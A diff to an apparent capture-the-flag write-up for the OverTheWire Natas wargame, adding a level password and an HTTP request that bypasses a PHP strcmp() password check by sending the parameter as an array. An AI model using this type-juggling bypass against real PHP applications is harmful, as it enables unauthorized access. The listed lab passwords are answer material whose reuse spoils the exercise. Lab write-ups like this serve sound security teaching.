@@ -28,6 +28,7 @@ The username is `natas` + the level.
 - 22: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
 - 23: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
 - 24: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
+- 25: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
 
 ## Level 9-10
 
@@ -444,3 +445,14 @@ Make a request like the following:
 GET /?passwd=20-iloveyou HTTP/1.1
 Host: natas23.natas.labs.overthewire.org
 ```
+
+## Level 23-24
+
+Make a request like the following:
+
+```http
+GET /?passwd=passwd%5B0%5D=1&passwd%5B1%5D=2 HTTP/1.1
+Host: natas24.natas.labs.overthewire.org
+```
+
+PHP 5.x and 7.x: When strcmp() receives an array as a parameter, it emits a Warning and—crucially—returns NULL.
